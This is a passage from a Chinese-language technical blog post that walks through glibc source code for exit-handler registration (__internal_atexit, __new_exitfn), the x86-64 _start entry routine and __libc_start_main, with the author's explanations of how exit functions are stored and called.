class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__internal_atexit (<span class="type">void</span> (*func) (<span class="type">void</span> *), <span class="type">void</span> *arg, <span class="type">void</span> *d,</span><br><span class="line">   <span class="keyword">struct</span> exit_function_list **listp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* As a QoI issue we detect NULL early with an assertion instead</span></span><br><span class="line"><span class="comment">     of a SIGSEGV at program exit when the handler is run (bug 20544).  */</span></span><br><span class="line">  assert (func != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  __libc_lock_lock (__exit_funcs_lock);</span><br><span class="line">  new = __new_exitfn (listp);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_MANGLE</span></span><br><span class="line">  PTR_MANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  new-&gt;func.cxa.fn = (<span class="type">void</span> (*) (<span class="type">void</span> *, <span class="type">int</span>)) func;</span><br><span class="line">  new-&gt;func.cxa.arg = arg;</span><br><span class="line">  new-&gt;func.cxa.dso_handle = d;</span><br><span class="line">  new-&gt;flavor = ef_cxa;</span><br><span class="line">  __libc_lock_unlock (__exit_funcs_lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就是用<code>__new_exitfn</code>找到<code>__exit_funcs</code>链表上一个合适的位置，然后写入函数，我们看<code>__new_exitfn</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Must be called with __exit_funcs_lock held.  */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *</span></span><br><span class="line"><span class="class">__<span class="title">new_exitfn</span> (<span class="keyword">struct</span> <span class="title">exit_function_list</span> **<span class="title">listp</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">p</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">l</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">r</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">size_t</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__exit_funcs_done)</span><br><span class="line">    <span class="comment">/* Exit code is finished processing all registered exit functions,</span></span><br><span class="line"><span class="comment">       therefore we fail this registration.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (l = *listp; l != <span class="literal">NULL</span>; p = l, l = l-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> (i = l-&gt;idx; i &gt; <span class="number">0</span>; --i)</span><br><span class="line"><span class="keyword">if</span> (l-&gt;fns[i - <span class="number">1</span>].flavor != ef_free)</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (i &gt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* This block is completely unused.  */</span></span><br><span class="line">      l-&gt;idx = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (l == <span class="literal">NULL</span> || i == <span class="keyword">sizeof</span> (l-&gt;fns) / <span class="keyword">sizeof</span> (l-&gt;fns[<span class="number">0</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* The last entry in a block is used.  Use the first entry in</span></span><br><span class="line"><span class="comment"> the previous block if it exists.  Otherwise create a new one.  */</span></span><br><span class="line">      <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  assert (l != <span class="literal">NULL</span>);</span><br><span class="line">  p = (<span class="keyword">struct</span> exit_function_list *)</span><br><span class="line">    <span class="built_in">calloc</span> (<span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> exit_function_list));</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      p-&gt;next = *listp;</span><br><span class="line">      *listp = p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  r = &amp;p-&gt;fns[<span class="number">0</span>];</span><br><span class="line">  p-&gt;idx = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* There is more room in the block.  */</span></span><br><span class="line">      r = &amp;l-&gt;fns[i];</span><br><span class="line">      l-&gt;idx = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark entry as used, but we don&#x27;t know the flavor now.  */</span></span><br><span class="line">  <span class="keyword">if</span> (r != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      r-&gt;flavor = ef_us;</span><br><span class="line">      ++__new_exitfn_called;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先尝试在<code>__exit_funcs</code>中找到一个<code>exit_function</code>类型的<code>ef_free</code>的位置, <code>ef_free</code>代表着此位置空闲<br>如果没找到, 就新建一个<code>exit_function</code>节点, 使用头插法插入<code>__exit_funcs</code>链表, 使用新节点的第一个位置作为分配到的<code>exit_function</code>结构体设置找到的<code>exit_function</code>的类型为<code>ef_us</code>, 表示正在使用中, 并返回<br>这里只是找位置，那么注册的是什么函数呢？这些函数在<code>main</code>之前就被注册了。未知生，焉知死？我们看一下程序的入口<code>_start</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">ENTRY (_start)</span><br><span class="line">/* Clearing frame pointer is insufficient, use CFI.  */</span><br><span class="line">cfi_undefined (rip)</span><br><span class="line">/* Clear the frame pointer.  The ABI suggests this be done, to mark</span><br><span class="line">   the outermost frame obviously.  */</span><br><span class="line">xorl %ebp, %ebp</span><br><span class="line"></span><br><span class="line">/* Extract the arguments as encoded on the stack and set up</span><br><span class="line">   the arguments for __libc_start_main (int (*main) (int, char **, char **),</span><br><span class="line">   int argc, char *argv,</span><br><span class="line">   void (*init) (void), void (*fini) (void),</span><br><span class="line">   void (*rtld_fini) (void), void *stack_end).</span><br><span class="line">   The arguments are passed via registers and on the stack:</span><br><span class="line">main:%rdi</span><br><span class="line">argc:%rsi</span><br><span class="line">argv:%rdx</span><br><span class="line">init:%rcx</span><br><span class="line">fini:%r8</span><br><span class="line">rtld_fini:%r9</span><br><span class="line">stack_end:stack.*/</span><br><span class="line"></span><br><span class="line">mov %RDX_LP, %R9_LP/* Address of the shared library termination</span><br><span class="line">   function.  */</span><br><span class="line">#ifdef __ILP32__</span><br><span class="line">mov (%rsp), %esi/* Simulate popping 4-byte argument count.  */</span><br><span class="line">add $4, %esp</span><br><span class="line">#else</span><br><span class="line">popq %rsi/* Pop the argument count.  */</span><br><span class="line">#endif</span><br><span class="line">/* argv starts just at the current stack top.  */</span><br><span class="line">mov %RSP_LP, %RDX_LP</span><br><span class="line">/* Align the stack to a 16 byte boundary to follow the ABI.  */</span><br><span class="line">and  $~15, %RSP_LP</span><br><span class="line"></span><br><span class="line">/* Push garbage because we push 8 more bytes.  */</span><br><span class="line">pushq %rax</span><br><span class="line"></span><br><span class="line">/* Provide the highest stack address to the user code (for stacks</span><br><span class="line">   which grow downwards).  */</span><br><span class="line">pushq %rsp</span><br><span class="line"></span><br><span class="line">/* These used to be the addresses of .fini and .init.  */</span><br><span class="line">xorl %r8d, %r8d</span><br><span class="line">xorl %ecx, %ecx</span><br><span class="line"></span><br><span class="line">#ifdef PIC</span><br><span class="line">mov main@GOTPCREL(%rip), %RDI_LP</span><br><span class="line">#else</span><br><span class="line">mov $main, %RDI_LP</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">/* Call the user&#x27;s main function, and exit with its value.</span><br><span class="line">   But let the libc call main.  Since __libc_start_main in</span><br><span class="line">   libc.so is called very early, lazy binding isn&#x27;t relevant</span><br><span class="line">   here.  Use indirect branch via GOT to avoid extra branch</span><br><span class="line">   to PLT slot.  In case of static executable, ld in binutils</span><br><span class="line">   2.26 or above can convert indirect branch into direct</span><br><span class="line">   branch.  */</span><br><span class="line">call *__libc_start_main@GOTPCREL(%rip)</span><br><span class="line"></span><br><span class="line">hlt/* Crash if somehow `exit&#x27; does return. */</span><br><span class="line">END (_start)</span><br><span class="line"></span><br><span class="line">/* Define a symbol for the first piece of initialized data.  */</span><br><span class="line">.data</span><br><span class="line">.globl __data_start</span><br><span class="line">__data_start:</span><br><span class="line">.long 0</span><br><span class="line">.weak data_start</span><br><span class="line">data_start = __data_start</span><br></pre></td></tr></table></figure><p>我们关注其传递给<code>__libc_start_main</code>的参数<code>main</code>，<code>argc</code>，<code>argv</code>，<code>init</code>，<code>fini</code>，<code>rtld_fini</code>，<code>stack_end</code>，前三个不用赘述，<code>init</code>，<code>fini</code>，<code>rtld_fini</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Note: The init and fini parameters are no longer used.  fini is</span></span><br><span class="line"><span class="comment">   completely unused, init is still called if not NULL, but the</span></span><br><span class="line"><span class="comment">   current startup code always passes NULL.  (In the future, it would</span></span><br><span class="line"><span class="comment">   be possible to use fini to pass a version code if init is NULL, to</span></span><br><span class="line"><span class="comment">   indicate the link-time glibc without introducing a hard</span></span><br><span class="line"><span class="comment">   incompatibility for new programs with older glibc versions.)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   For dynamically linked executables, the dynamic segment is used to</span></span><br><span class="line"><span class="comment">   locate constructors and destructors.  For statically linked</span></span><br><span class="line"><span class="comment">   executables, the relevant symbols are access directly.  */</span></span><br><span class="line">STATIC <span class="type">int</span></span><br><span class="line"><span class="title function_">LIBC_START_MAIN</span> <span class="params">(<span class="type">int</span> (*main) (<span class="type">int</span>, <span class="type">char</span> **, <span class="type">char</span> ** MAIN_AUXVEC_DECL),</span></span><br><span class="line"><span class="params"> <span class="type">int</span> argc, <span class="type">char</span> **argv,</span></span><br><span class="line"><span class="params">#ifdef LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line"><span class="params"> ElfW(<span class="type">auxv_t</span>) *auxvec,</span></span><br><span class="line"><span class="params">#endif</span></span><br><span class="line"><span class="params"> __typeof (main) init,</span></span><br><span class="line"><span class="params"> <span class="type">void</span> (*fini) (<span class="type">void</span>),</span></span><br><span class="line"><span class="params"> <span class="type">void</span> (*rtld_fini) (<span class="type">void</span>), <span class="type">void</span> *stack_end)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="type">char</span> **ev = &amp;argv[argc + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  __environ = ev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Store the lowest stack address.  This is done in ld.so if this is</span></span><br><span class="line"><span class="comment">     the code for the DSO.  */</span></span><br><span class="line">  __libc_stack_end = stack_end;</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> HAVE_AUX_VECTOR</span></span><br><span class="line">  <span class="comment">/* First process the auxiliary vector since we need to find the</span></span><br><span class="line"><span class="comment">     program header to locate an eventually present PT_TLS entry.  */</span></span><br><span class="line"><span class="meta">#  <span class="keyword">ifndef</span> LIBC_START_MAIN_AUXVEC_ARG</span></span><br><span class="line">  ElfW(<span class="type">auxv_t</span>) *auxvec;</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">char</span> **evp = ev;</span><br><span class="line">    <span class="keyword">while</span> (*evp++ != <span class="literal">NULL</span>)</span><br><span class="line">      ;</span><br><span class="line">    auxvec = (ElfW(<span class="type">auxv_t</span>) *) evp;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#  <span class="keyword">endif</span></span></span><br><span class="line">  _dl_aux_init (auxvec);</span><br><span class="line">  <span class="keyword">if</span> (GL(dl_phdr) == <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Starting from binutils-2.23, the linker will define the</span></span><br><span class="line"><span class="comment">         magic symbol __ehdr_start to point to our own ELF header</span></span><br><span class="line"><span class="comment">         if it is visible in a segment that also includes the phdrs.</span></span><br><span class="line"><span class="comment">         So we can set up _dl_phdr and _dl_phnum even without any</span></span><br><span class="line"><span class="comment">         information from auxv.  */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Ehdr)</span> __ehdr_start</span><br><span class="line"><span class="meta"># <span class="keyword">if</span> BUILD_PIE_DEFAULT</span></span><br><span class="line">__<span class="title function_">attribute__</span> <span class="params">((visibility (<span class="string">&quot;hidden&quot;</span>)))</span>;</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">__attribute__ ((weak, visibility (<span class="string">&quot;hidden&quot;</span>)));</span><br><span class="line">      <span class="keyword">if</span> (&amp;__ehdr_start != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">        &#123;</span><br><span class="line">          assert (__ehdr_start.e_phentsize == <span class="keyword">sizeof</span> *GL(dl_phdr));</span><br><span class="line">          GL(dl_phdr) = (<span class="type">const</span> <span class="type">void</span> *) &amp;__ehdr_start + __ehdr_start.e_phoff;</span><br><span class="line">          GL(dl_phnum) = __ehdr_start.e_phnum;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize very early so that tunables can use it.  */</span></span><br><span class="line">  __libc_init_secure ();</span><br><span class="line"></span><br><span class="line">  __tunables_init (__environ);</span><br><span class="line"></span><br><span class="line">  ARCH_INIT_CPU_FEATURES ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Do static pie self relocation after tunables and cpu features</span></span><br><span class="line"><span class="comment">     are setup for ifunc resolvers. Before this point relocations</span></span><br><span class="line"><span class="comment">     must be avoided.  */</span></span><br><span class="line">  _dl_relocate_static_pie ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Perform IREL&#123;,A&#125; relocations.  */</span></span><br><span class="line">  ARCH_SETUP_IREL ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The stack guard goes into the TCB, so initialize it early.  */</span></span><br><span class="line">  ARCH_SETUP_TLS ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In some architectures, IREL&#123;,A&#125; relocations happen after TLS setup in</span></span><br><span class="line"><span class="comment">     order to let IFUNC resolvers benefit from TCB information, e.g. powerpc&#x27;s</span></span><br><span class="line"><span class="comment">     hwcap and platform fields available in the TCB.  */</span></span><br><span class="line">  ARCH_APPLY_IREL ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the stack checker&#x27;s canary.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_STACK_GUARD</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __stack_chk_guard = stack_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> DL_SYSDEP_OSCHECK</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* This needs to run to initiliaze _dl_osversion before TLS</span></span><br><span class="line"><span class="comment">       setup might check it.  */</span></span><br><span class="line">    DL_SYSDEP_OSCHECK (__libc_fatal);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize libpthread if linked in.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__pthread_initialize_minimal != <span class="literal">NULL</span>)</span><br><span class="line">    __pthread_initialize_minimal ();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set up the pointer guard value.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> pointer_chk_guard = _dl_setup_pointer_guard (_dl_random,</span><br><span class="line"> stack_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> THREAD_SET_POINTER_GUARD</span></span><br><span class="line">  THREAD_SET_POINTER_GUARD (pointer_chk_guard);</span><br><span class="line"><span class="meta"># <span class="keyword">else</span></span></span><br><span class="line">  __pointer_chk_guard_local = pointer_chk_guard;</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !SHARED  */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Register the destructor of the dynamic linker if there is any.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (rtld_fini != <span class="literal">NULL</span>))</span><br><span class="line">    __cxa_atexit ((<span class="type">void</span> (*) (<span class="type">void</span> *)) rtld_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">  <span class="comment">/* Perform early initialization.  In the shared case, this function</span></span><br><span class="line"><span class="comment">     is called from the dynamic loader as early as possible.  */</span></span><br><span class="line">  __libc_early_init (<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call the initializer of the libc.  This is only needed here if we</span></span><br><span class="line"><span class="comment">     are compiling for the static library in which case we haven&#x27;t</span></span><br><span class="line"><span class="comment">     run the constructors in `_dl_start_user&#x27;.  */</span></span><br><span class="line">  __libc_init_first (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Register the destructor of the statically-linked program.  */</span></span><br><span class="line">  __cxa_atexit (call_fini, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Some security at this point.  Prevent starting a SUID binary where</span></span><br><span class="line"><span class="comment">     the standard file descriptors are not opened.  We have to do this</span></span><br><span class="line"><span class="comment">     only for statically linked applications since otherwise the dynamic</span></span><br><span class="line"><span class="comment">     loader did the work already.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__libc_enable_secure, <span class="number">0</span>))</span><br><span class="line">    __libc_check_standard_fds ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call the initializer of the program, if any.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">    GLRO(dl_debug_printf) (<span class="string">&quot;\ninitialize program: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (init != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* This is a legacy program which supplied its own init</span></span><br><span class="line"><span class="comment">       routine.  */</span></span><br><span class="line">    (*init) (argc, argv, __environ MAIN_AUXVEC_PARAM);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* This is a current program.  Use the dynamic segment to find</span></span><br><span class="line"><span class="comment">       constructors.  */</span></span><br><span class="line">    call_init (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Auditing checkpoint: we have a new object.  */</span></span><br><span class="line">  _dl_audit_preinit (GL(dl_ns)[LM_ID_BASE]._ns_loaded);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS))</span><br><span class="line">    GLRO(dl_debug_printf) (<span class="string">&quot;\ntransferring control: %s\n\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span> <span class="comment">/* !SHARED */</span></span></span><br><span class="line">  call_init (argc, argv, __environ);</span><br><span class="line"></span><br><span class="line">  _dl_debug_initialize (<span class="number">0</span>, LM_ID_BASE);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  __libc_start_call_main (main, argc, argv MAIN_AUXVEC_PARAM);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Starting with glibc 2.34, the init parameter is always NULL.  Older</span></span><br><span class="line"><span class="comment">   libcs are not prepared to handle that.  The macro</span></span><br><span class="line"><span class="comment">   DEFINE_LIBC_START_MAIN_VERSION creates GLIBC_2.34 alias, so that</span></span><br><span class="line"><span class="comment">   newly linked binaries reflect that dependency.  The macros below</span></span><br><span class="line"><span class="comment">   expect that the exported function is called</span></span><br><span class="line"><span class="comment">   __libc_start_main_impl.  */</span></span><br></pre></td></tr></table></figure><p>从注释我们知道，自<code>glibc2.34</code>以后，<code>init</code>和<code>fini</code>两个参数已经废弃，可以看到，其内部自行使用了<code>call_init</code>函数，我们找到源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 